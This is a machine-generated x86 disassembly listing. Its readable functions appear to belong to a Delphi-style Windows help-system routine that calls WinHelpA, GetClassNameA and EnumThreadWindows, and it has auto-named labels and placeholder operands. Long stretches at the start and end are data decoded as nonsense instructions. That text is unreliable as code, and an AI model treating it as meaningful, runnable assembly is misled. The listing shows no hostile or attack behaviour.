test [ eax + eax - 0x4b ] al
test [ eax + eax - 0x43 ] al
test [ eax + eax - 0x3b ] al
test [ eax + eax + 0x65 ] al
test [ eax + eax + 0x6d ] al
test [ eax + eax + 0x75 ] al
test [ eax + eax + 0x7d ] al
test [ eax + eax + 0x5d ] al
test [ eax + eax + 0x3 ] al
lodsd [ esi ]
cmp ch ah
test [ eax + eax + 0x20 ] al
jge r-xdata
cmp ch ah
test [ eax + eax + 0x20 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
test [ eax + eax + 0x30 ] eax
test [ eax + eax ] eax
add [ eax ] al
add ah dl
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
test [ eax + eax + 0x24 ] eax
add [ eax ] al
add [ ecx + edx + 0x354c0040 ] ah
inc eax
add [ eax ] bh
pop ebx
inc eax
add [ ebx + ebx * 2 + 0x40 ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ ebx + ebx * 2 + 0x40 ] dl
add al dl
xor al [ eax ]
je r-xdata
shl al 0xe9
inc [ ebx ]
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
add [ ebp - 0x7c ] bl
inc esp
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
add [ eax ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
adc [ edi + 0x1c0042 ] dh
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4486b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404118
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4041b0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4486bc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_448600
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4486b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404118
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4041b0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4486bc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4486d0
push ebx
mov ebx eax
mov eax ebx
call sub_448a00
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405ab8
sub_44870c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448773
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_448600
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44877a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_448784
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44880c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4486f8
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448813
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_44881f
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4488a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_448f44
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4488ae
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_448600
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44882c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4488a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_448f44
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4488ae
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_448600
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4488b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4489ac
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_448600
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
mov eax ebx
call sub_448f44
test al al
je r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4489b3
lea eax [ ebp - 0x1c ]
call sub_404118
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_448600
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_448e9c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40416c
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_448a1c
push ebx
mov ebx eax
mov eax ebx
call sub_448a00
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405ab8
pop ebx
retn
mov eax rw-data
call sub_405ab8
sub_448a4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_448aa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448aab
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_448600
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_448ab4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448baa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_409240
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_448600
mov eax ebx
call sub_448f44
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448bb1
lea eax [ ebp - 0x110 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404388
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_448e9c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404388
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_448bc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_448c2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448c31
lea eax [ ebp - 0x8 ]
call sub_404118
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_448600
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_448c3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448cbc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_448600
mov eax ebx
call sub_448f44
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448cc3
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_448e9c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_448ccc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_448db7
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_448f44
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448dbe
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40413c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_40850c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_448e9c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_40850c
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_40416c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_448600
mov eax [ ebp - 0x14 ]
call sub_4045d8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_448dcc
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408ca4
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_448e27
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408c80
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_448e9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_448f12
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_448e80
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f19
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4080dc
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_448f28
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_448f44
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_448e80
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_448f24
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_448f28
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_448fa0
sub_448fa0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_44901d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_448a00
call GetTickCount
mov ebx eax
push 0x0
call sub_406678
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_448600
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449024
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44902c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403668
call sub_405ad0
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_449074
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4490a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44910e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449115
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405ab8
mov eax rw-data
call sub_405ab8
mov eax rw-data
call sub_405ab8
mov eax rw-data
call sub_404118
mov eax rw-data
call sub_405ab8
mov eax [ rw-data ]
call sub_4486d0
sub_449118
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44916a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449171
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44902c
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405ab8
mov edx eax
mov eax [ rw-data ]
call sub_42b9b0
sub_449176
inc esp
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
inc eax
mov esi 0x540b0044
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc esp
add [ eax + 0x600044be ] dl
xor eax 0x35540040
inc eax
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 4 - 0x6e ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 2 - 0x6e ] si
inc esp
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
xchg esp eax
xchg ecx eax
inc esp
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc esp
jb r-xdata
inc eax
add [ eax - 0x6e ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
add ah ah
xchg ebx eax
inc esp
jb r-xdata
inc esp
add [ eax ] al
mov edi 0xbeb00044
inc esp
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax - 0x42 ] al
outsd
insb
jae r-xdata
add [ esi ] al
add [ eax ] al
add [ eax + 0x6004491 ] ch
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
add [ eax + eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax - 0x6fffbb42 ] ah
mov esi 0x35600044
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 4 + 0x44 ] dh
jb r-xdata
inc esp
add [ eax - 0x41 ] bh
inc esp
add [ edi * 4 - 0x412bffbc ] bl
inc esp
add al ah
mov esp 0xbf840044
inc esp
add [ eax ] bh
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
test al 0x92
inc esp
add [ ebp + esi + 0x40 ] cl
add [ eax - 0x6fffbb42 ] ah
add [ eax ] al
in al 0x93
inc ebx
outsd
outsb
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi + edi * 4 ] ch
inc esp
add [ esi + edi * 4 ] bl
inc esp
add [ eax ] bl
mov esi 0xbd1c0044
inc esp
add ah dl
mov esi 0xbce00044
inc esp
add [ esi + edi * 4 ] dh
inc esp
add [ eax ] bh
mov esi 0xbe400044
add [ ebx + 0x4492f4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xchg ebx eax
inc esp
add [ eax + eax ] bh
add [ eax ] al
add al 0x92
inc esp
add [ ebp + esi + 0x40 ] cl
add [ eax - 0x6fffbb42 ] ah
mov esi 0x35600044
inc eax
add [ ebp + esi + 0x40 ] dl
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
lodsb [ esi ]
xchg ecx eax
inc esp
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
inc esp
add [ ecx + eax * 8 - 0x41e7ffbc ] ah
inc esp
add [ edi * 4 - 0x3fa3ffbc ] bl
inc esp
add al ah
mov esp 0xbe340044
inc esp
add [ eax ] bh
mov esi 0xbe400044
inc ebx
outsd
outsb
je r-xdata
mov esi 0xbfa40044
inc esp
add [ eax ] al
mov edi 0xbeb00044
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x44 ] si
xchg esp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6c ] dh
inc esp
add [ eax ] al
add [ eax ] al
insb
xchg ebx eax
inc esp
add [ ebp + esi + 0x40 ] cl
add [ eax - 0x3bffbb42 ] ah
mov edi 0x35600044
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi + edi * 4 ] ch
inc esp
add [ eax - 0x41 ] ah
mov esi 0x35600044
inc eax
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x3c ] si
xchg ebx eax
inc esp
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
inc eax
add al bl
mov esp 0xbe1c0044
inc esp
add [ eax ] bl
mov esi 0xbd1c0044
inc esp
add [ eax - 0x1fffbb44 ] al
mov esp 0xbe340044
xor al [ eax ]
or al 0x33
outsd
insd
inc esp
add [ ebp + esi + 0x40 ] cl
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x6b ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 8 - 0x6c ] si
inc esp
add [ eax ] bh
xchg ebx eax
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax - 0x37ffbb40 ] bh
mov edi 0xc1000044
inc esp
add [ ecx + eax * 8 + 0x44 ] bh
add [ eax - 0x4fffbb3f ] dl
rol [ eax + eax + 0xf ] 0x54
inc esp
jb r-xdata
mov esi 0xbe380044
inc esp
add [ eax - 0x42 ] al
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
aam 0x94
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xchg ebp eax
inc esp
add [ eax ] dh
add [ eax ] al
test al 0x92
inc esp
add [ ebp + esi + 0x40 ] cl
add [ eax - 0x6fffbb42 ] ah
mov esi 0x35600044
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + eax * 8 ] ch
inc esp
add [ edi + edi * 4 ] ch
inc eax
add [ edi + edi * 4 ] ch
inc esp
add [ eax - 0x41 ] ah
push esp
xor eax 0x32b40040
inc eax
add al dl
xor al [ eax ]
or al 0x33
inc esp
jb r-xdata
inc esp
add [ eax ] bh
mov esi 0xbe400044
inc esp
add [ ebx ] cl
push esp
xor al 0xbe
je r-xdata
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax ] ch
pop esp
inc edx
add [ esp + ebx * 2 ] dl
inc edx
add [ ebx + edx * 8 + 0x540e0044 ] dh
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
xor al 0x96
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6a ] ah
inc esp
add [ eax - 0x37ffbb40 ] bh
mov edi 0xc1000044
inc esp
add [ ecx + eax * 8 + 0x44 ] bh
add [ eax - 0x4fffbb3f ] dl
